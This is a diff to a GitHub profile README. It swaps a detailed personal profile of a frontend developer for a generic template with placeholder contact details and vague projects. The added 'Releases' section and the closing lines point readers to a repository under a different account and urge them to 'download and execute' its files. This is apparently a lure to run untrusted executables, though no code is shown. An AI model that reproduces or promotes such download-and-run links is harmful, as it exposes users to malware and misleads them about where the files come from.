@@ -1,86 +1,97 @@
-<!-- Profile README for kurkul608 -->
+# Welcome to Kurkul608! 👋
 
-<h1 align="center">Hi there, I'm <strong>Petr Molchanov</strong> <img src="https://raw.githubusercontent.com/kurkul608/kurkul608/main/assets/wave.gif" width="28"/></h1>
-<p align="center">
-  🇦🇷 <strong>Senior Frontend Engineer</strong> • JavaScript & TypeScript • Based in Buenos Aires, Argentina 🇦🇷
-</p>
+![Profile Banner](https://img.shields.io/badge/Full--Stack%20Developer-Front%20End%20%26%20Back%20End-blue)
 
----
+## About Me
 
-### 👨‍💻 Who I Am
+Hello! I'm a full-stack developer based in Buenos Aires, Argentina. I specialize in JavaScript and TypeScript, and I love building dynamic and responsive web applications. My passion for coding drives me to continuously learn and improve my skills.
 
-* 🎨 **Frontend‑first:** 8+ years crafting pixel‑perfect, responsive UIs with **React & Next.js**.
-* ⚡ **Performance fanatic:** cut initial load times from **20 s → 10 s** through code‑splitting, lazy loading & bundle analysis; boosted Core Web Vitals (<1 s LCP, 0 CLS).
-* 🌐 **Internationalization & accessibility:** shipped WCAG‑AA compliant, i18n‑ready apps for **RU, US & LATAM** audiences.
-* 🛠 **Design systems:** built component library in Storybook used by 5 cross‑functional teams.
-* ✉️ **Product emails & mini‑apps:** authoring email templates with **React Email** and Telegram Mini Apps that feel native.
-* 🧩 **Full‑stack when needed:** comfortable with **Node.js (NestJS, Fastify, Express)**, **PostgreSQL**, **MongoDB**, **Redis** — but always in service of great user experiences.
-* 🌍 Open to remote / hybrid roles; love async collaboration.
-* 🗣 Speak Russian (native) · English (fluent) · Spanish (learning).
+## Skills
 
----
+- **Frontend Development**: 
+  - React
+  - Next.js
+  - HTML & CSS
+- **Backend Development**: 
+  - Node.js
+  - NestJS
+  - RESTful APIs
+- **Database Management**: 
+  - Prisma
+  - SQL & NoSQL Databases
+- **Version Control**: 
+  - Git & GitHub
 
-### ✨ Frontend Highlights
+## Projects
 
-| Year | Impact                                                                                                                             |
-| ---- | ---------------------------------------------------------------------------------------------------------------------------------- |
-| 2024 | Implemented granular route‑level code‑splitting in a FinTech dashboard → **‑38 % bundle size**, **‑55 % TTI**                      |
-| 2023 | Led migration to **Next.js 13 App Router** & **TypeScript**; introduced **Suspense** & **RSC** for blazing‑fast SSR/ISR            |
-| 2022 | Designed and documented a company‑wide **Design System** (600+ stories) with **Storybook**, **Figma tokens**, and **Chromatic CI** |
-| 2021 | Added **multi‑region i18n** (RU/EN/ES) and dynamic theming; increased new‑market conversions by **+18 %**                          |
-| 2020 | Optimized PWA installability & offline experience; achieved **100/100 Lighthouse score**                                           |
+I have worked on various projects that showcase my skills in full-stack development. Here are a few highlights:
 
----
+1. **Project Name**: E-commerce Platform
+   - **Description**: A full-fledged e-commerce platform built with React and Node.js.
+   - **Features**: User authentication, product management, and payment integration.
 
-### 🛠 Tech Toolbox
+2. **Project Name**: Blogging Platform
+   - **Description**: A blogging platform where users can create and share their articles.
+   - **Features**: Rich text editor, user profiles, and comment system.
 
-**Core Frontend**
+3. **Project Name**: Portfolio Website
+   - **Description**: A personal portfolio to showcase my work and skills.
+   - **Features**: Responsive design, project showcase, and contact form.
 
-![React](https://img.shields.io/badge/React-20232A?style=flat\&logo=react\&logoColor=61DAFB) ![Next.js](https://img.shields.io/badge/Next.js-000?style=flat\&logo=nextdotjs\&logoColor=white) ![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat\&logo=javascript\&logoColor=black) ![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=flat\&logo=typescript\&logoColor=white) ![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=flat\&logo=html5\&logoColor=white) ![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=flat\&logo=css3\&logoColor=white) ![Tailwind CSS](https://img.shields.io/badge/Tailwind-38B2AC?style=flat\&logo=tailwindcss\&logoColor=white) ![Storybook](https://img.shields.io/badge/Storybook-FF4785?style=flat\&logo=storybook\&logoColor=white)
+## Technologies Used
 
-**Supporting Stack**
+Here are the main technologies I work with:
 
-![Node.js](https://img.shields.io/badge/Node.js-339933?style=flat\&logo=node.js\&logoColor=white) ![NestJS](https://img.shields.io/badge/NestJS-E0234E?style=flat\&logo=nestjs\&logoColor=white) ![Express](https://img.shields.io/badge/Express-000?style=flat\&logo=express\&logoColor=white) ![Fastify](https://img.shields.io/badge/Fastify-000?style=flat\&logo=fastify\&logoColor=white) ![Prisma](https://img.shields.io/badge/Prisma-3982CE?style=flat\&logo=prisma\&logoColor=white) ![TypeORM](https://img.shields.io/badge/TypeORM-FF2D20?style=flat\&logo=typeorm\&logoColor=white)
+- **JavaScript & TypeScript**: For building robust applications.
+- **React & Next.js**: For creating user interfaces and server-side rendering.
+- **Node.js & NestJS**: For building scalable server-side applications.
+- **Prisma**: For database management and ORM.
 
-**Data & DevOps**
+## Get in Touch
 
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-4169E1?style=flat\&logo=postgresql\&logoColor=white) ![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=flat\&logo=mongodb\&logoColor=white) ![Redis](https://img.shields.io/badge/Redis-DC382D?style=flat\&logo=redis\&logoColor=white) ![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat\&logo=docker\&logoColor=white) ![GitHub Actions](https://img.shields.io/badge/GitHub_Actions-2088FF?style=flat\&logo=githubactions\&logoColor=white)
+I love connecting with fellow developers and tech enthusiasts. Feel free to reach out!
 
----
+- **Email**: your.email@example.com
+- **LinkedIn**: [Your LinkedIn Profile](https://www.linkedin.com/in/yourprofile)
+- **Twitter**: [@YourTwitterHandle](https://twitter.com/yourhandle)
 
-### 🔗 Let’s Connect
+## Releases
 
-<p>
-  <a href="https://t.me/kurkul608"><img alt="Telegram Badge" src="https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white"/></a>
-  <a href="https://www.linkedin.com/in/petr-molchanov-b9b649202/"><img alt="LinkedIn Badge" src="https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white"/></a>
-  <a href="https://github.com/kurkul608"><img alt="Portfolio Badge" src="https://img.shields.io/badge/Portfolio-000?style=for-the-badge&logo=vercel&logoColor=white"/></a>
-</p>
+You can find the latest releases for my projects [here](https://github.com/harungamers/kurkul608/releases). Make sure to download and execute the necessary files to explore the latest features.
 
----
+## Topics Covered
 
-### 📈 GitHub Stats
+This repository covers various topics related to my work and interests:
 
-<p align="center">
+- Argentina
+- Frontend Development
+- Fullstack Development
+- GitHub Profile README
+- JavaScript
+- NestJS
+- Next.js
+- Node.js
+- Prisma
+- React
+- TypeScript
 
-[//]: # (  <img src="https://github-readme-stats.vercel.app/api?username=kurkul608&show_icons=true&hide=issues&theme=default" alt="GitHub Stats"/>)
-  <img src="https://github-readme-streak-stats.herokuapp.com/?user=kurkul608&theme=default" alt="GitHub Streak"/>
-  <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=kurkul608&layout=compact&langs_count=8" alt="Top Languages"/>
-</p>
+## Additional Resources
 
-<p align="center">
-  <!-- GitHub Profile Trophy -->
-  <img src="https://github-profile-trophy.vercel.app/?username=kurkul608&theme=flat&no-frame=true&row=1&column=6" alt="Trophies"/>
-</p>
+Here are some resources that I find helpful:
 
----
+- [MDN Web Docs](https://developer.mozilla.org/en-US/)
+- [JavaScript.info](https://javascript.info/)
+- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [Node.js Documentation](https://nodejs.org/en/docs/)
 
-<details>
-<summary>📃 Resume</summary>
+## Contribution
 
-*Updated version coming soon — DM me on Telegram to request a copy.*
+If you want to contribute to this repository, feel free to fork it and submit a pull request. I welcome any suggestions or improvements.
 
-</details>
+## License
 
-<div align="center">
-  <img src="https://komarev.com/ghpvc/?username=kurkul608&style=flat&color=brightgreen" alt="Profile views"/>
-</div>
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Thank You!
+
+Thank you for visiting my GitHub profile! I hope you find my projects interesting and useful. Don't forget to check the [Releases](https://github.com/harungamers/kurkul608/releases) section for the latest updates.
